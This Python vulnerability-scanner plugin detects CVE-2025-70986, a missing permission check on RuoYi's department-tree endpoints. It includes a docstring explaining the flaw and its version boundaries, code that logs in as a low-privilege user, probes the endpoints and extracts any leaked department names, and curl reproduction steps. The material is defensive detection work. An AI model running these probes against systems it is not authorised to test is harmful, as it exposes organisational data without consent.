# -*- coding: utf-8 -*-
"""CVE-2025-70986：RuoYi 部门树未授权访问（GET /system/dept/selectDeptTree、treeData）

漏洞
====
RuoYi 4.8.0 及更早版本的 `SysDeptController.selectDeptTree`（部门树页面）与
`treeDataExcludeChild`（部门树 JSON 数据接口）**没有任何 `@RequiresPermissions` 注解**
——任意已登录用户（无论角色/权限）都能访问：

    漏洞版（<=4.8.0）：
        @GetMapping(value = { "/selectDeptTree/{deptId}", "/selectDeptTree/{deptId}/{excludeId}" })
        public String selectDeptTree(@PathVariable("deptId") Long deptId, ...)   // 无权限注解
        {
            mmap.put("dept", deptService.selectDeptById(deptId));   // 渲染目标部门信息
            return prefix + "/tree";
        }

    修复版（>=4.8.2）：
        @RequiresPermissions("system:dept:list")                     // ← 新增
        @GetMapping(value = { "/selectDeptTree/{deptId}", ... })
        public String selectDeptTree(...)
        // 同批补齐的还有 treeData/{excludeId} 与某个 POST 方法（system:dept:add）

影响：普通用户可越权查看组织架构（部门名称、层级、编号），为后续定向攻击提供地图。

关于版本归属（与 CVE 标注不一致，以源码与实测为准）
====================================================
CVE-2025-70986 标注「影响 v4.8.2」，但实测 **4.8.2 与 4.8.3 的源码里该注解已存在**
（4.8.0 与 4.8.2 的源码 diff 中可见是本批新增）。即：修复落在 4.8.2 这一版，
CVE 标注的应是「上报时测试的最新版本」。实测边界：
  - v4.7.8 / v4.8.0：无注解，普通账号可访问部门树接口 → 漏洞
  - v4.8.2 / v4.8.3：有注解，Shiro 拒绝（RuoYi - 403 权限页）→ 安全
  - v4.8.1 未实测，按修复落点推断为受影响
关于权限等级：NVD 标 PR:N（无需权限），实测**需要已登录的低权账号**
（未认证请求一律 302 → 登录页），按实测标注 PR:L。

判定方式（差分，且不依赖猜中有效部门 id）
==========================================
修复版被拒时返回的也是 **HTTP 200 + 403 页面**（RuoYi 把 403 渲染成 200），
状态码无区分度。实测发现一个更稳的差分形态——**无效部门编号**（如 0）：

  | 响应形态             | 漏洞版（<=4.8.0）      | 修复版（>=4.8.2）      |
  |----------------------|------------------------|------------------------|
  | treeData/0           | 200 JSON（业务层执行） | 200 + RuoYi-403 权限页 |
  | selectDeptTree/0     | 500 JSON（执行后 NPE） | 200 + RuoYi-403 权限页 |
  | 未认证（基线）       | 302 → 登录页           | 302 → 登录页           |

即：漏洞版的业务层在**无权限下照样执行**（能拿到数据则更佳）；修复版在进入业务层
之前就被权限门拦下。两个探针都未命中权限门 ⇒ 缺少权限注解 ⇒ CONFIRMED。
若恰好命中有效部门，还能直接给出泄露的部门名称作为强证据。
"""

import json
import re

from common.logger import get_logger
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from config import settings
from core.auth_chain import isolated_auth_session
from core.http import join_url
from core.session import SessionManager
from lib.colors import no, ok
from lib.reporter import emit
from plugins.base import PluginBase

logger = get_logger(__name__)

# 修复版 Shiro 权限拒绝页的稳定标记（<title>RuoYi - 403</title>）
DENIED_MARKER = "RuoYi - 403"
# 部门树页面的稳定标记（已核实 4 个版本模板一致：ztree 相关引用各 3 处）
TREE_PAGE_MARKER = 'id="treeName"'
TREE_NAME_RE = re.compile(r'name="treeName"[^>]*value="([^"]*)"')
# 登录页标记（会话失效守卫）
LOGIN_PAGE_MARKER = "登录若依系统"


class Cve202570986SelectDeptTreePlugin(PluginBase):
    """部门树未授权访问检测（CVE-2025-70986）"""

    name = "部门树越权访问"
    cve = "CVE-2025-70986"
    severity = "medium"
    category = "vuln"
    description = "RuoYi <=4.8.0 的部门树接口无权限注解，普通用户可越权查看组织架构"
    # D2: 影响版本（实测：4.7.8/4.8.0 无注解；4.8.2/4.8.3 已修）
    # 注意：运算符与版本号之间不能有空格（version_in_range 的正则会静默跳过带空格的条件）
    affected_versions = ">=4.0,<=4.8.0"
    # D12: CVSS v3.1 —— 按实测标注 PR:L（NVD 标 PR:N，与「需已登录」的实测不符）
    cvss_vector = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
    compliance = "等保2.0:8.1.3;OWASP:A01:2021"
    fix = "升级至 RuoYi 4.8.2+（官方已在 selectDeptTree/treeData 上补 system:dept:list 权限注解）"
    fix_detail = (
        "【升级方案】升级到 RuoYi 4.8.2 或更高版本\n"
        "【代码修复】给 SysDeptController.selectDeptTree / treeDataExcludeChild 补 @RequiresPermissions('system:dept:list')\n"
        "【权限收敛】清理普通角色多余的 system:dept:* 权限（官方种子角色即带全套部门权限）\n"
        "【合规】等保2.0 8.1.3 访问控制"
    )
    reproduce = (
        "# 1. 用一个**没有** system:dept:list 权限的普通账号登录取会话\n"
        "curl -c c.txt -X POST 'http://target/login' -d 'username=lowpriv&password=***&validateCode=***'\n"
        "\n"
        "# 2. 访问部门树接口（deptId 取任意值即可：无效 id 也能区分——漏洞版业务层 500，修复版 403 页）\n"
        'curl -b c.txt -i "http://target/system/dept/treeData/0"\n'
        "\n"
        "# 预期（漏洞版）：HTTP 200 + JSON（业务层执行，可能直接返回部门数据）\n"
        "# 预期（修复版）：HTTP 200 + RuoYi - 403 权限页"
    )

    def verify(self, target, session):
        """在**独立会话**中做差分验证

        判定**不依赖猜中有效部门 id**：无效 id（如 0）在漏洞版上会让业务层执行并抛 NPE，
        在修复版上则被 Shiro 权限门先拦下——两种形态截然不同（见模块 docstring 的对照表）。

        @param target: 目标站点根 URL
        @param session: 共享 HTTP 会话（本插件不使用——需鉴权，必须隔离）
        @return: ScanResult —— 业务层无权限执行为 CONFIRMED；被权限门拦截为 SAFE；形态不定为 UNKNOWN
        """
        with isolated_auth_session(
            target,
            settings.RuoYiLowPriv.USERNAME,
            settings.RuoYiLowPriv.PASSWORD,
            timeout=settings.RuoYiAuth.TIMEOUT,
        ) as (sess, ok_login, reason):
            if not ok_login:
                hint = "（该验证需要低权限账号，不是 admin）" if reason != "captcha" else ""
                emit(no(f"部门树越权访问（登录失败：{reason}）{hint}"))
                return ScanResult(
                    kind="info",
                    name=self.name,
                    status=STATUS_UNKNOWN,
                    evidence=f"低权账号 {settings.RuoYiLowPriv.USERNAME} 登录失败：{reason}{hint}",
                )

            url_data = join_url(target, "/system/dept/treeData/0")
            url_page = join_url(target, "/system/dept/selectDeptTree/0")

            # 未认证基线：接口应要求登录（若匿名也能拿到部门数据，属更严重问题，记入证据）
            anon = SessionManager(timeout=settings.RuoYiAuth.TIMEOUT)
            try:
                anon_bodies = [anon.get(u).text or "" for u in (url_data, url_page)]
            except Exception:
                anon_bodies = []
            finally:
                anon.close()
            anon_open = any(self._extract_leaked_depts(b) for b in anon_bodies)

            # 低权账号（无 system:dept:list）的两个探针
            try:
                r_data = sess.get(url_data)
                r_page = sess.get(url_page)
            except Exception as e:
                emit(no("部门树越权访问（请求异常）"))
                return ScanResult(
                    kind="info",
                    name=self.name,
                    status=STATUS_UNKNOWN,
                    url=url_data,
                    evidence=f"请求异常：{e}",
                )
            bodies = {"treeData": r_data.text or "", "selectDeptTree": r_page.text or ""}

            # 会话失效守卫：响应是登录页说明认证态丢了，不能据此判定
            if any(LOGIN_PAGE_MARKER in b for b in bodies.values()):
                emit(no("部门树越权访问（会话失效，响应为登录页）"))
                return ScanResult(
                    kind="info",
                    name=self.name,
                    status=STATUS_UNKNOWN,
                    url=url_data,
                    evidence="低权请求返回登录页，会话未生效，不予判定",
                )

            denied = {k: DENIED_MARKER in b for k, b in bodies.items()}
            if all(denied.values()):
                emit(no("不存在部门树越权访问"))
                return ScanResult(
                    kind="info",
                    name=self.name,
                    status=STATUS_SAFE,
                    url=url_data,
                    evidence=(
                        f"无 system:dept:list 权限的账号 {settings.RuoYiLowPriv.USERNAME} 访问 "
                        f"treeData 与 selectDeptTree 均被拒（RuoYi - 403 权限页）⇒ 权限注解已生效"
                    ),
                )
            if any(denied.values()):
                # 一个被拦一个没拦：形态矛盾，不能贸然下结论
                emit(no("部门树越权访问（响应形态矛盾）"))
                return ScanResult(
                    kind="info",
                    name=self.name,
                    status=STATUS_UNKNOWN,
                    url=url_data,
                    evidence=f"两个探针一个被权限页拦截、一个未拦截（{denied}），形态矛盾，不予判定",
                )

            # 全部未命中权限门 ⇒ 业务层在无权限下执行 ⇒ 缺少权限注解
            leaked = self._extract_leaked_depts(bodies["treeData"])
            tree_name = self._rendered_dept_name(bodies["selectDeptTree"])
            if leaked:
                detail = f"泄露 {len(leaked)} 个部门，样例：" + "、".join(str(n) for _, n in leaked[:3])
            elif tree_name:
                detail = f"部门树页面渲染出部门名称「{tree_name}」"
            else:
                detail = (
                    f"业务层在无权限下仍执行（treeData 返回 {len(bodies['treeData'])} 字节 JSON、"
                    f"selectDeptTree 返回 {len(bodies['selectDeptTree'])} 字节），但未能取到具体部门条目"
                )
            extra_note = "；未认证请求同样可读取（匿名暴露，更严重）" if anon_open else ""
            emit(ok("存在部门树越权访问（无权限账号可读取组织架构）"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url_data,
                evidence=(
                    f"无 system:dept:list 权限的账号 {settings.RuoYiLowPriv.USERNAME} 访问部门树接口"
                    f"未被权限门拦截：{detail}；未认证基线则被重定向到登录页{extra_note}"
                    f"⇒ selectDeptTree/treeData 缺少权限注解"
                ),
                fix=self.fix,
                extra={
                    "vuln_type": "auth",
                    "plugin_name": "cve_2025_70986_select_dept_tree",
                    "cve": self.cve,
                    "leaked_depts": [n for _, n in leaked] if leaked else [],
                },
            )

    # ── 辅助 ────────────────────────────────────────────────────

    @staticmethod
    def _extract_leaked_depts(body):
        """从 treeData 的 JSON 里提取部门 (id, name) 列表；非 JSON/无数据返回 []"""
        try:
            data = json.loads(body or "")
        except Exception:
            return []
        if not isinstance(data, list):
            return []
        out = []
        for item in data:
            if isinstance(item, dict) and item.get("name"):
                out.append((item.get("id"), str(item.get("name"))))
        return out

    @staticmethod
    def _rendered_dept_name(body):
        """若响应是渲染成功的部门树页，返回其中的部门名称；否则 None"""
        if TREE_PAGE_MARKER not in (body or ""):
            return None
        m = TREE_NAME_RE.search(body)
        value = (m.group(1) or "").strip() if m else ""
        return value or None
